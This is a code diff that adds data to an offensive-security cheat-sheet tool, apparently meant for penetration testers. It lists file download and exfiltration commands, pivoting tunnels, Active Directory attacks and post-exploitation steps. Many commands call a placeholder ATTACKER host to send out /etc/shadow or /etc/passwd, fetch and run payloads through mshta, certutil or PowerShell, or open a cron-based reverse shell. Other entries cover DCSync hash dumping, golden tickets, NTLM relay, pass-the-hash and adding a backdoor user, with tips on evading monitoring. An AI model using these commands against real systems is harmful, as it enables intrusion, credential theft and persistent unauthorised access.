+    {id:"impacket-smb",name:"Impacket SMB Server",os:["linux"],tags:["smb","windows","share"],desc:"Serve files over SMB — ideal for Windows targets that block HTTP",req:"impacket-smbserver on attacker (pip install impacket)",usage:"impacket-smbserver share /path/to/files -smb2support\nThen on Windows: copy \\\\ATTACKER\\share\\file.exe .",note:"Add -username user -password pass for authenticated shares."},
+    {id:"nc-serve",name:"Netcat Serve",os:["linux","macos"],tags:["nc","simple","no-http"],desc:"Serve a single file via raw TCP — no HTTP needed",req:"nc on attacker",usage:"nc -lvnp PORT < file.bin\nOn target: nc ATTACKER PORT > file.bin",note:"One-shot — nc exits after transfer. No progress indicator."},
+    {id:"php-server",name:"PHP Built-in Server",os:["linux","macos"],tags:["php","http"],desc:"PHP built-in web server — alternative when python3 is absent",req:"php on attacker",usage:"php -S 0.0.0.0:PORT\nThen wget/curl from target",note:"Serves current directory."},
+  ],
+  linux_download:[
+    {id:"wget-dl",name:"wget Download",os:["linux"],tags:["wget","http"],desc:"Most reliable Linux download tool",req:"wget on target",usage:"wget http://ATTACKER:PORT/file.ext -O /tmp/file.ext",note:"Add -q for quiet mode. Check: which wget"},
+    {id:"curl-dl",name:"cURL Download",os:["linux","macos"],tags:["curl","http"],desc:"Download file with curl — often present when wget is absent",req:"curl on target",usage:"curl http://ATTACKER:PORT/file.ext -o /tmp/file.ext",note:"Use -s for silent. curl -k for insecure SSL."},
+    {id:"b64-transfer",name:"Base64 Transfer",os:["linux","macos"],tags:["base64","no-network","clipboard"],desc:"Transfer files as base64 through the shell — no outbound network needed",req:"base64 binary (pre-installed everywhere)",usage:"# ON ATTACKER: encode\nbase64 -w0 file.bin\n# Copy the output string\n# ON TARGET: decode\necho 'BASE64STRING' | base64 -d > /tmp/file.bin",note:"Best for small files (<1MB). Perfect for airgapped situations."},
+    {id:"nc-recv",name:"Netcat Receive",os:["linux"],tags:["nc","simple"],desc:"Receive a file sent from attacker via netcat",req:"nc on target",usage:"# On attacker:\nnc -lvnp PORT < file.bin\n# On target:\nnc -nv ATTACKER PORT > /tmp/file.bin",note:"Verify with md5sum/sha256sum on both sides."},
+    {id:"devtcp-dl",name:"/dev/tcp Download",os:["linux"],tags:["bash","no-tools","creative"],desc:"Download a file using only bash /dev/tcp — no wget/curl needed",req:"/bin/bash with /dev/tcp support",usage:"exec 3<>/dev/tcp/ATTACKER/PORT\necho -e \"GET /file.ext HTTP/1.0\\r\\n\\r\\n\">&3\ncat <&3 > /tmp/file.ext",note:"Raw HTTP over /dev/tcp. Headers will be mixed in — strip with tail or sed if needed."},
+  ],
+  windows_download:[
+    {id:"ps-iwr",name:"PowerShell IWR",os:["windows"],tags:["powershell","http","modern"],desc:"Invoke-WebRequest — modern PowerShell download (PS 3.0+)",req:"PowerShell 3.0+",usage:"Invoke-WebRequest -Uri http://ATTACKER:PORT/file.exe -OutFile C:\\Windows\\Temp\\file.exe",note:"Alias: iwr or wget. Add -UseBasicParsing if IE engine errors occur."},
+    {id:"ps-webclient",name:"PowerShell WebClient",os:["windows"],tags:["powershell","http","ps2"],desc:"WebClient download — works on PowerShell 2.0 (older systems)",req:"PowerShell 2.0+",usage:"(New-Object Net.WebClient).DownloadFile('http://ATTACKER:PORT/file.exe','C:\\Temp\\file.exe')",note:"Use DownloadString() for in-memory execution without writing to disk."},
+    {id:"certutil",name:"certutil Decode",os:["windows"],tags:["lolbin","no-ps","b64"],desc:"certutil -urlcache — LOLBin for downloading files, no PowerShell needed",req:"certutil.exe (built-in to all Windows)",usage:"certutil.exe -urlcache -split -f http://ATTACKER:PORT/file.exe C:\\Temp\\file.exe",note:"Also decodes base64: certutil -decode encoded.b64 output.exe."},
+    {id:"bitsadmin",name:"bitsadmin",os:["windows"],tags:["lolbin","background"],desc:"Background Intelligent Transfer Service — background download job",req:"bitsadmin.exe (built-in to all Windows)",usage:"bitsadmin /transfer job /download /priority high http://ATTACKER:PORT/file.exe C:\\Temp\\file.exe",note:"Leaves BITS job in Event Log."},
+    {id:"win-smb",name:"SMB Copy (Windows)",os:["windows"],tags:["smb","unc","no-http"],desc:"Copy from SMB share — bypasses HTTP inspection",req:"SMB access to attacker (run impacket-smbserver on attacker)",usage:"copy \\\\ATTACKER\\share\\file.exe C:\\Temp\\file.exe",note:"Works well in Active Directory environments."},
+    {id:"win-b64",name:"Base64 via PowerShell",os:["windows"],tags:["base64","no-network","powershell"],desc:"Transfer files as base64 through PowerShell shell — no HTTP needed",req:"PowerShell",usage:"# On attacker: encode\n[Convert]::ToBase64String([IO.File]::ReadAllBytes('file.exe'))\n# On target: paste & decode\n$b=[Convert]::FromBase64String('BASE64HERE')\n[IO.File]::WriteAllBytes('C:\\Temp\\f.exe',$b)",note:"Best for small files. Completely bypasses network monitoring."},
+    {id:"mshta-exec",name:"mshta LOLBin",os:["windows"],tags:["lolbin","http","execute"],desc:"mshta.exe — LOLBin that downloads and executes HTA files directly",req:"mshta.exe (built-in to all Windows)",usage:"mshta http://ATTACKER:PORT/payload.hta",note:"Executes the HTA directly without writing to disk."},
+  ],
+  exfil:[
+    {id:"curl-upload",name:"cURL Exfil",os:["linux","macos"],tags:["exfil","http","post"],desc:"Exfiltrate a file from target to attacker via HTTP POST",req:"curl on target + python uploadserver on attacker",usage:"# Attacker: python3 -m uploadserver PORT\n# Target:\ncurl -F 'files=@/etc/shadow' http://ATTACKER:PORT/upload",note:"File lands in ./uploads/ on attacker. Add -s for silent exfil."},
+    {id:"nc-exfil",name:"Netcat Exfil",os:["linux"],tags:["exfil","nc"],desc:"Send file to attacker via netcat",req:"nc on target",usage:"# Attacker: nc -lvnp PORT > received.file\n# Target:\nnc ATTACKER PORT < /etc/shadow",note:"Raw TCP — very fast. No encryption."},
+    {id:"b64-exfil",name:"Base64 Exfil",os:["linux","macos","windows"],tags:["exfil","b64","covert"],desc:"Exfiltrate via base64 output — works through any shell",req:"base64 binary on target",usage:"# Linux:\nbase64 /etc/shadow\n# Windows:\n[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\secret.txt'))",note:"Most covert method. Output appears as random-looking text."},
+    {id:"dns-exfil",name:"DNS Exfiltration",os:["linux"],tags:["exfil","dns","covert","2026"],desc:"Exfiltrate data via DNS queries — bypasses most egress filters",req:"DNS resolution from target. Use Burp Collaborator, interactsh, or dnscat2.",usage:"data=$(cat /etc/passwd | base64 | tr -d '\\n')\nnslookup ${data:0:50}.yourdomain.com ATTACKER",note:"DNS is almost never blocked outbound. Tools: dnscat2, iodine, DNSExfiltrator."},
+  ],
+};
+
+/* ══════════════════════════════════════════════════════
+   PIVOTING DATA
+══════════════════════════════════════════════════════ */
+const PIVOTING_DATA={
+  chisel:[
+    {id:"ch-server",name:"Chisel Server (Attacker)",os:["linux","macos"],tags:["socks5","reverse","tunnel"],
+     desc:"Start chisel server on attacker to accept reverse tunnel connections",
+     req:"chisel binary on attacker (github.com/jpillora/chisel)",
+     usage:"# Standard reverse SOCKS5 server:\n./chisel server -p PORT --reverse --socks5\n\n# With authentication:\n./chisel server -p PORT --reverse --auth user:pass\n\n# Download:\nwget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz\ngzip -d chisel_linux_amd64.gz && chmod +x chisel_linux_amd64",
+     note:"Use port 80/443/8080 to blend in. After client connects, SOCKS5 proxy opens on attacker:1080."},
+    {id:"ch-client-socks",name:"Chisel Client → SOCKS5",os:["linux","windows","macos"],tags:["socks5","pivot","dynamic"],
+     desc:"Connect back to attacker, open SOCKS5 proxy for dynamic tunneling into internal network",
+     req:"chisel binary on target",
+     usage:"# Linux:\n./chisel client ATTACKER:PORT R:1080:socks\n\n# Windows:\n.\\chisel.exe client ATTACKER:PORT R:1080:socks\n\n# Configure proxychains (/etc/proxychains.conf):\n# socks5 127.0.0.1 1080\n# Then: proxychains nmap -sV 192.168.1.0/24",
+     note:"R: prefix = reverse tunnel from attacker. proxychains4 -q nmap -Pn -sT -p 22,80,443 target works well."},
+    {id:"ch-client-port",name:"Chisel Client → Port Forward",os:["linux","windows"],tags:["portfwd","specific-port"],
+     desc:"Forward a specific internal port to attacker (e.g., internal RDP → attacker:13389)",
+     req:"chisel binary on target",
+     usage:"# Forward target's internal RDP (192.168.1.10:3389) to attacker:13389:\n./chisel client ATTACKER:PORT R:13389:192.168.1.10:3389\n\n# Then connect:\nxfreerdp /v:127.0.0.1:13389 /u:user /p:password",
+     note:"Multiple forwards in one command: R:13389:192.168.1.10:3389 R:11433:192.168.1.20:1433"},
+  ],
+  ligolo:[
+    {id:"lig-proxy",name:"Ligolo-ng Proxy Setup",os:["linux"],tags:["tun","kernel","modern"],
+     desc:"Set up ligolo-ng on attacker — creates a kernel tun interface for seamless routing (no proxychains needed)",
+     req:"ligolo-ng proxy binary (github.com/nicocha30/ligolo-ng) + sudo",
+     usage:"# Create tun interface:\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n\n# Start proxy:\n./proxy -selfcert -laddr 0.0.0.0:11601\n\n# Use port 443 to blend in:\n./proxy -selfcert -laddr 0.0.0.0:443",
+     note:"Ligolo-ng is superior for multiple pivots — kernel routing means ALL tools work natively without proxychains."},
+    {id:"lig-agent",name:"Ligolo-ng Agent (Target)",os:["linux","windows"],tags:["agent","connect"],
+     desc:"Run agent on compromised host to connect back to proxy",
+     req:"ligolo-ng agent binary on target",
+     usage:"# Linux:\n./agent -connect ATTACKER:11601 -ignore-cert\n\n# Windows:\n.\\agent.exe -connect ATTACKER:11601 -ignore-cert\n\n# With obfuscation:\n./agent -connect ATTACKER:11601 -ignore-cert -obf",
+     note:"Use -retry for persistent reconnect. In ligolo proxy console type 'session' to see connected agents."},
+    {id:"lig-tunnel",name:"Ligolo-ng Tunnel + Route",os:["linux"],tags:["route","tunnel","setup"],
+     desc:"Start tunnel and add routes to reach internal network — run after agent connects",
+     req:"Agent connected in ligolo proxy console",
+     usage:"# In ligolo proxy console:\nsession                        # list and select session\nifconfig                       # view target's interfaces\ntunnel_start --tun ligolo      # start the tunnel\n\n# In separate terminal on attacker:\nsudo ip route add 192.168.1.0/24 dev ligolo\n\n# Now reach internal hosts directly:\nnmap -sV 192.168.1.100\ncrackmapexec smb 192.168.1.0/24",
+     note:"Each subnet pivot = add another route. For multi-hop: run agent on each pivot and repeat."},
+  ],
+  ssh:[
+    {id:"ssh-local",name:"SSH Local Port Forward",os:["linux","macos"],tags:["local","portfwd","ssh"],
+     desc:"Forward a remote/internal port to your local machine via SSH",
+     req:"SSH access to pivot host",
+     usage:"# Access target:3306 (MySQL) via localhost:3306:\nssh -L 3306:target:3306 user@pivot -N\n\n# Access target:80 via localhost:8080:\nssh -L 8080:target:80 user@pivot -N\n\n# Background it:\nssh -fNL 8080:target:80 user@pivot",
+     note:"-N = no command. -f = background. -o ServerAliveInterval=60 to keep alive."},
+    {id:"ssh-remote",name:"SSH Remote Port Forward",os:["linux","macos"],tags:["remote","reverse","ssh"],
+     desc:"Expose a port from target to your attacker machine — useful after catching a shell on a target behind NAT",
+     req:"SSH access from target back to attacker",
+     usage:"# From TARGET: expose target:80 on attacker:8080\nssh -R 8080:localhost:80 user@ATTACKER -N\n\n# Expose entire shell as a tunnel:\nssh -R 9001:localhost:22 user@ATTACKER -N\n# Then: ssh -p 9001 localhost",
+     note:"Requires GatewayPorts yes or AllowRemoteForwarding yes in attacker sshd_config for remote bind."},
+    {id:"ssh-dynamic",name:"SSH Dynamic SOCKS5",os:["linux","macos"],tags:["socks5","dynamic","proxychains"],
+     desc:"Create a SOCKS5 proxy through SSH for full dynamic tunneling — route all tools through pivot",
+     req:"SSH access to pivot host",
+     usage:"ssh -D 1080 user@pivot -N\n\n# /etc/proxychains.conf:\ndynamic_chain\nsocks5 127.0.0.1 1080\n\n# Use:\nproxychains nmap -Pn -sT 192.168.1.0/24\nproxychains curl http://internal-host/\nproxychains crackmapexec smb 192.168.1.0/24",
+     note:"Add 'dynamic_chain' to proxychains.conf for chaining multiple proxies."},
+    {id:"ssh-jump",name:"SSH Jump Host (-J)",os:["linux","macos"],tags:["jump","chain","modern"],
+     desc:"Chain SSH through multiple jump hosts in one command",
+     req:"SSH on each hop",
+     usage:"# Single jump:\nssh -J user@pivot user@target\n\n# Double jump (chain):\nssh -J user@pivot1,user@pivot2 user@target\n\n# With port forward through jump:\nssh -J user@pivot -L 8080:internal:80 user@target",
+     note:"Modern replacement for ProxyJump config. Requires OpenSSH 7.3+."},
+    {id:"ssh-sshuttle",name:"sshuttle (VPN over SSH)",os:["linux","macos"],tags:["vpn","transparent","sshuttle"],
+     desc:"Transparent VPN over SSH — route subnets without proxychains. Every tool works natively.",
+     req:"sshuttle on attacker (apt install sshuttle), SSH on pivot",
+     usage:"# Route 192.168.1.0/24 through pivot:\nsshuttle -r user@pivot 192.168.1.0/24\n\n# Include DNS:\nsshuttle -r user@pivot 192.168.1.0/24 --dns\n\n# Multiple subnets:\nsshuttle -r user@pivot 192.168.1.0/24 10.10.0.0/16",
+     note:"Best UX for pentesters — works with any TCP tool without proxychains config."},
+  ],
+  socat:[
+    {id:"socat-relay",name:"Socat TCP Relay",os:["linux"],tags:["relay","portfwd","simple"],
+     desc:"Relay TCP traffic through a pivot host — no SSH needed, just socat",
+     req:"socat on pivot host",
+     usage:"# On pivot: forward :8080 → internal:80\nsocat TCP-LISTEN:8080,fork TCP:192.168.1.10:80\n\n# Relay reverse shell through pivot:\n# On pivot:\nsocat TCP-LISTEN:4444,fork TCP:ATTACKER:4444\n# Shell connects to pivot:4444 → relay to attacker:4444",
+     note:"Add nohup to background: nohup socat TCP-LISTEN:8080,fork TCP:target:80 &"},
+    {id:"socat-ssl-relay",name:"Socat SSL Relay",os:["linux"],tags:["ssl","relay","encrypted"],
+     desc:"Encrypt pivot traffic with SSL — looks like HTTPS to network defenders",
+     req:"socat with OpenSSL on pivot + cert files",
+     usage:"# On pivot:\nsocat OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem,verify=0,fork TCP:192.168.1.10:80\n\n# On attacker, connect:\nsocat - OPENSSL:pivot:443,verify=0",
+     note:"Generate cert on pivot: openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes"},
+  ],
+  msf:[
+    {id:"msf-route",name:"MSF Route + Autoroute",os:["linux","windows"],tags:["meterpreter","route","msf"],
+     desc:"Add a route through a Meterpreter session to reach internal subnets",
+     req:"Active Meterpreter session",
+     usage:"# In msfconsole — autoroute (recommended):\nuse post/multi/manage/autoroute\nset SESSION 1\nrun\n\n# Manual route:\nroute add 192.168.1.0/24 1   # session 1\nroute print\n\n# Combined with SOCKS proxy:\nuse auxiliary/server/socks_proxy\nset SRVPORT 1080\nset VERSION 5\nrun -j",
+     note:"Autoroute scans all interfaces automatically. Combine with socks_proxy for proxychains."},
+    {id:"msf-portfwd",name:"MSF Port Forward",os:["linux","windows"],tags:["meterpreter","portfwd"],
+     desc:"Forward a port through a Meterpreter session to your attacker localhost",
+     req:"Active Meterpreter session",
+     usage:"# In meterpreter prompt:\nportfwd add -l 3389 -p 3389 -r 192.168.1.100\nportfwd list\n\n# Then connect:\nxfreerdp /v:127.0.0.1:3389 /u:user\n\n# Remove:\nportfwd delete -l 3389",
+     note:"Runs through encrypted Meterpreter channel. No firewall rules needed on attacker."},
+  ],
+};
+
+/* ══════════════════════════════════════════════════════
+   ACTIVE DIRECTORY DATA
+══════════════════════════════════════════════════════ */
+const AD_DATA={
+  enum:[
+    {id:"ad-bh",phase:"Enumeration",title:"BloodHound / SharpHound",tags:["bloodhound","graph","attack-path"],
+     desc:"Collect AD data for BloodHound attack path analysis — fastest way to find privesc routes.",
+     commands:[
+       {label:"SharpHound (from Windows)",cmd:"./SharpHound.exe --CollectionMethods All --ZipFilename bloodhound.zip"},
+       {label:"bloodhound-python (Linux/no agent)",cmd:"bloodhound-python -u user -p 'password' -ns DC_IP -d domain.local -c all"},
+       {label:"Start Neo4j",cmd:"sudo neo4j console  # browse to http://localhost:7474"},
+       {label:"BloodHound GUI",cmd:"./BloodHound  # import the zip → Queries → Shortest Path to DA"},
+     ],
+     tip:"Run 'Find Shortest Paths to Domain Admins' first. Check 'Owned Principals' after marking pwned users. Kerberoastable users next."},
+    {id:"ad-ldap",phase:"Enumeration",title:"LDAP Enumeration",tags:["ldap","users","groups"],
+     desc:"Dump AD objects via LDAP — users, groups, policies, SPNs.",
+     commands:[
+       {label:"ldapdomaindump (HTML output)",cmd:"ldapdomaindump -u 'domain\\user' -p 'password' DC_IP -o /tmp/ldap"},
+       {label:"ldapsearch - all users",cmd:"ldapsearch -H ldap://DC_IP -x -b 'DC=domain,DC=local' -D 'user@domain.local' -w 'password' '(objectClass=user)' sAMAccountName"},
+       {label:"enum4linux-ng (full scan)",cmd:"enum4linux-ng -A -u user -p password DC_IP"},
+       {label:"CrackMapExec users",cmd:"crackmapexec smb DC_IP -u user -p password --users"},
+       {label:"CrackMapExec shares",cmd:"crackmapexec smb DC_IP -u user -p password --shares"},
+     ],
+     tip:"ldapdomaindump creates domain_users.html — great for quick overview of all users, groups and flags like 'DONT_REQ_PREAUTH'."},
+    {id:"ad-nmap",phase:"Enumeration",title:"Nmap AD Recon",tags:["nmap","smb","scripts"],
+     desc:"Nmap NSE scripts for initial AD reconnaissance without credentials.",
+     commands:[
+       {label:"Find domain controllers",cmd:"nmap -p 88,135,389,445,464,636 --open -oN dcs.txt SUBNET/24"},
+       {label:"SMB enumeration",cmd:"nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery DC_IP"},
+       {label:"Kerberos user enum",cmd:"nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=domain.local,userdb=users.txt DC_IP"},
+       {label:"LDAP root DSE (no creds)",cmd:"nmap -p 389 --script ldap-rootdse DC_IP"},
+     ],
+     tip:"Port 88 open = Kerberos = Domain Controller. DCs also have 389 (LDAP) + 3268 (Global Catalog) + 5985 (WinRM) open."},
+  ],
+  kerberoast:[
+    {id:"ad-kerb",phase:"Kerberoasting",title:"Kerberoasting",tags:["spn","tgs","crack"],
+     desc:"Request TGS tickets for accounts with SPNs set — crack offline without alerting monitoring.",
+     commands:[
+       {label:"impacket-GetUserSPNs (request hashes)",cmd:"impacket-GetUserSPNs domain.local/user:password -dc-ip DC_IP -request -outputfile hashes.kerberoast"},
+       {label:"Invoke-Kerberoast (PowerShell)",cmd:"Import-Module PowerView.ps1; Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash"},
+       {label:"Rubeus (Windows agent)",cmd:"Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt"},
+       {label:"Crack with hashcat",cmd:"hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force"},
+       {label:"Find SPNs manually",cmd:"impacket-GetUserSPNs domain.local/user:password -dc-ip DC_IP"},
+     ],
+     tip:"Target SPNs: MSSQLSvc (SQL Server), HTTP (web), cifs (file share). RC4 tickets (etype 23) crack faster than AES256. Check if service account has 'Password Never Expires'."},
+  ],
+  asreproast:[
+    {id:"ad-asrep",phase:"AS-REP Roasting",title:"AS-REP Roasting",tags:["asrep","no-preauth","crack"],
+     desc:"Request AS-REP hashes for accounts with 'Do not require Kerberos pre-authentication' — no credentials needed.",
+     commands:[
+       {label:"impacket-GetNPUsers (no creds)",cmd:"impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep.hashes"},
+       {label:"impacket-GetNPUsers (with creds)",cmd:"impacket-GetNPUsers domain.local/user:password -dc-ip DC_IP -request -format hashcat"},
+       {label:"Rubeus (Windows)",cmd:"Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes"},
+       {label:"Crack with hashcat",cmd:"hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt"},
+     ],
+     tip:"No auth required for GetNPUsers — combine with a user list from OSINT or Kerberos user enum. Check ldapdomaindump output for 'DONT_REQ_PREAUTH' flag."},
+  ],
+  pth:[
+    {id:"ad-pth",phase:"Lateral Movement",title:"Pass-the-Hash (PTH)",tags:["pth","ntlm","hash"],
+     desc:"Use NTLM hash directly for authentication — no need to crack. Requires local admin rights on target.",
+     commands:[
+       {label:"impacket-psexec (SYSTEM shell)",cmd:"impacket-psexec 'domain/user@target' -hashes :NTLM_HASH"},
+       {label:"impacket-wmiexec (semi-silent)",cmd:"impacket-wmiexec 'domain/user@target' -hashes :NTLM_HASH"},
+       {label:"impacket-smbexec (no upload)",cmd:"impacket-smbexec 'domain/user@target' -hashes :NTLM_HASH"},
+       {label:"CrackMapExec spray subnet",cmd:"crackmapexec smb CIDR -u Administrator -H NTLM_HASH --local-auth"},
+       {label:"evil-winrm (WinRM port 5985)",cmd:"evil-winrm -i target -u user -H NTLM_HASH"},
+     ],
+     tip:"NTLM hash format is LM:NT — the NT (last 32 hex chars) is what matters. Use ':NTLM_HASH' (colon prefix). CME marks (Pwn3d!) on success."},
+  ],
+  dcsync:[
+    {id:"ad-dcsync",phase:"Domain Compromise",title:"DCSync + Dump Hashes",tags:["dcsync","secretsdump","ntds"],
+     desc:"Impersonate a DC to pull all password hashes — requires Domain Admin or 'Replication' ACL rights.",
+     commands:[
+       {label:"secretsdump - NTLM only (fast)",cmd:"impacket-secretsdump domain/admin@DC_IP -just-dc-ntlm"},
+       {label:"secretsdump - full dump",cmd:"impacket-secretsdump domain/admin@DC_IP -just-dc"},
+       {label:"Get krbtgt hash",cmd:"impacket-secretsdump domain/admin@DC_IP -just-dc-user krbtgt"},
+       {label:"mimikatz (from Windows)",cmd:"lsadump::dcsync /domain:domain.local /all /csv"},
+       {label:"mimikatz - specific user",cmd:"lsadump::dcsync /domain:domain.local /user:krbtgt"},
+     ],
+     tip:"Always grab the krbtgt hash — it enables Golden Ticket attacks, giving persistent DA access even after password resets."},
+    {id:"ad-golden",phase:"Domain Compromise",title:"Golden Ticket",tags:["golden","krbtgt","persistence"],
+     desc:"Forge TGTs using krbtgt hash — persistent domain admin access for 10 years. Survives password resets.",
+     commands:[
+       {label:"Get domain SID",cmd:"impacket-lookupsid domain/user:password@DC_IP | grep 'Domain SID'"},
+       {label:"impacket-ticketer",cmd:"impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXXXXXXX-domain-SID -domain domain.local administrator"},
+       {label:"Use the ticket",cmd:"export KRB5CCNAME=administrator.ccache\nimpacket-psexec -k -no-pass domain/administrator@DC_HOSTNAME"},
+       {label:"mimikatz golden ticket",cmd:"kerberos::golden /user:administrator /domain:domain.local /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt"},
+     ],
+     tip:"Golden tickets survive password changes. Only remediation: reset krbtgt password TWICE with 10-hour gap. SID must end in the actual domain SID (not FQDN)."},
+  ],
+  ntlm_relay:[
+    {id:"ad-relay",phase:"Initial Access",title:"NTLM Relay Attack",tags:["responder","ntlmrelayx","relay"],
+     desc:"Capture and relay NTLM authentication from victims to target services — no cracking required.",
+     commands:[
+       {label:"Check SMB signing (prerequisite)",cmd:"crackmapexec smb SUBNET --gen-relay-list targets.txt  # only unsigned hosts can be relayed"},
+       {label:"Responder (capture mode, no servers)",cmd:"# Edit Responder.conf: SMB=Off HTTP=Off\nsudo responder -I eth0 -dw"},
+       {label:"ntlmrelayx to SMB",cmd:"impacket-ntlmrelayx -tf targets.txt -smb2support"},
+       {label:"ntlmrelayx + interactive shell",cmd:"impacket-ntlmrelayx -tf targets.txt -smb2support -i"},
+       {label:"ntlmrelayx to LDAP (delegate access)",cmd:"impacket-ntlmrelayx -tf dc_ip.txt -smb2support --delegate-access"},
+       {label:"Trigger auth (PetitPotam/Coerce)",cmd:"python3 PetitPotam.py ATTACKER DC_IP  # or dfscoerce.py\n# Or wait for natural LLMNR/NBT-NS poisoning"},
+     ],
+     tip:"SMB signing disabled = relayable. Check with CME first. Relaying to LDAP with --delegate-access can create a computer account with delegation rights → full compromise."},
+  ],
+  lateral:[
+    {id:"ad-lateral",phase:"Lateral Movement",title:"Lateral Movement Toolkit",tags:["psexec","wmiexec","smb","rdp"],
+     desc:"Quick reference for all common lateral movement techniques with credentials.",
+     commands:[
+       {label:"PsExec (SYSTEM shell, noisy)",cmd:"impacket-psexec domain/user:password@target"},
+       {label:"WMIExec (semi-silent, user context)",cmd:"impacket-wmiexec domain/user:password@target"},
+       {label:"SMBExec (no file upload)",cmd:"impacket-smbexec domain/user:password@target"},
+       {label:"ATExec (single command)",cmd:"impacket-atexec domain/user:password@target 'whoami'"},
+       {label:"evil-winrm (WinRM 5985/5986)",cmd:"evil-winrm -i target -u user -p password"},
+       {label:"RDP (xfreerdp)",cmd:"xfreerdp /v:target /u:user /p:password /cert-ignore +clipboard /dynamic-resolution"},
+       {label:"CrackMapExec spray + exec",cmd:"crackmapexec smb CIDR -u user -p password -x 'whoami' --no-bruteforce"},
+     ],
+     tip:"WMIExec is the most silent — doesn't create a service or leave files. ATExec best for quick command execution. 'Pwn3d!' in CME = local admin confirmed."},
+  ],
+};
+
+/* ══════════════════════════════════════════════════════
+   POST-EX (abbreviated for space — same as v2)
+══════════════════════════════════════════════════════ */
+const POSTEX_STEPS={
+  linux:[
+    {id:"lx-who",phase:"Situational Awareness",title:"Who Am I?",desc:"Identify your user, groups, and privilege level.",commands:[{label:"User + groups",cmd:"id && whoami"},{label:"Sudo privileges",cmd:"sudo -l"},{label:"Login history",cmd:"last -a | head -20"},{label:"Logged-in users",cmd:"who -a"},{label:"Env vars with creds",cmd:"env | grep -i 'pass\\|key\\|secret\\|token\\|api'"}],tip:"sudo -l is the single most valuable check. ANY sudo permission is potentially exploitable."},
+    {id:"lx-sys",phase:"Situational Awareness",title:"System Information",desc:"OS version and kernel — critical for choosing the right exploit.",commands:[{label:"OS release",cmd:"cat /etc/os-release && cat /etc/*release 2>/dev/null"},{label:"Kernel version",cmd:"uname -a"},{label:"Architecture",cmd:"arch && lscpu | head -5"},{label:"Hostname",cmd:"hostname -f"},{label:"In a container?",cmd:"cat /proc/1/cgroup 2>/dev/null | head -5"}],tip:"Kernel version → check exploit-db.com. Container detection: look for .dockerenv or cgroup entries."},
+    {id:"lx-net",phase:"Situational Awareness",title:"Network Enumeration",desc:"Map the network — find internal hosts and pivot points.",commands:[{label:"IP addresses",cmd:"ip a || ifconfig -a"},{label:"Routing table",cmd:"ip route || route -n"},{label:"Active connections",cmd:"ss -tulnp || netstat -tulnp"},{label:"ARP table",cmd:"arp -a || ip neigh"},{label:"DNS / hosts",cmd:"cat /etc/resolv.conf && cat /etc/hosts"}],tip:"Dual-homed hosts (2+ interfaces) are pivot points. Locally listening services may be exploitable from inside."},
+    {id:"lx-files",phase:"Situational Awareness",title:"Interesting Files & Creds",desc:"Hunt for SSH keys, config files, and hardcoded credentials.",commands:[{label:"SSH private keys",cmd:"find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null"},{label:"Config files with creds",cmd:"grep -rli 'password\\|passwd\\|secret\\|api_key' /etc /home /var/www 2>/dev/null | head -20"},{label:"World-writable files",cmd:"find / -writable -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -20"},{label:"Shell history",cmd:"cat ~/.bash_history 2>/dev/null; cat ~/.zsh_history 2>/dev/null"}],tip:"SSH private keys are jackpots — try every key against every discovered host on port 22."},
+    {id:"lx-suid",phase:"Privilege Escalation",title:"SUID / Capabilities",desc:"SUID binaries run as their owner (often root). Check GTFOBins for exploitation.",commands:[{label:"All SUID binaries",cmd:"find / -perm -4000 -type f 2>/dev/null"},{label:"Interesting SUID",cmd:"find / -perm -4000 -type f 2>/dev/null | grep -Ev 'snap|proc'"},{label:"Linux capabilities",cmd:"getcap -r / 2>/dev/null"},{label:"Sudo version",cmd:"sudo --version"}],tip:"Visit gtfobins.github.io — search each binary you find. Even 'cat' with SUID can read /etc/shadow."},
+    {id:"lx-persist",phase:"Persistence",title:"Establish Persistence",desc:"Maintain access even if the shell dies or the box reboots.",commands:[{label:"Add authorized SSH key",cmd:"echo 'YOUR_PUBKEY' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"},{label:"Cron reverse shell",cmd:"(crontab -l; echo '* * * * * bash -i >& /dev/tcp/IP/PORT 0>&1') | crontab -"},{label:"Add user (if root)",cmd:"useradd -m -s /bin/bash -G sudo hacker && echo 'hacker:P@ss' | chpasswd"}],tip:"SSH authorized_keys is the stealthiest persistence — no cron noise, appears as normal SSH auth in logs."},
+  ],
+  windows:[
+    {id:"w-who",phase:"Situational Awareness",title:"Who Am I?",desc:"Identify user, groups, and privileges before anything else.",commands:[{label:"Full user info",cmd:"whoami /all"},{label:"Current privileges",cmd:"whoami /priv"},{label:"Local users",cmd:"net user"},{label:"Local admins",cmd:"net localgroup administrators"}],tip:"SeImpersonatePrivilege = path to SYSTEM via Potato attacks (GodPotato/PrintSpoofer)."},
+    {id:"w-sys",phase:"Situational Awareness",title:"System Information",desc:"Gather OS version, patch level, and architecture.",commands:[{label:"Full system info",cmd:"systeminfo"},{label:"Installed patches",cmd:"wmic qfe list brief | sort"},{label:"Architecture",cmd:"echo %PROCESSOR_ARCHITECTURE%"},{label:"Domain info",cmd:"systeminfo | findstr /B /C:\"Domain\""}],tip:"Missing patches: run wesng.py against systeminfo output to find exploits offline."},
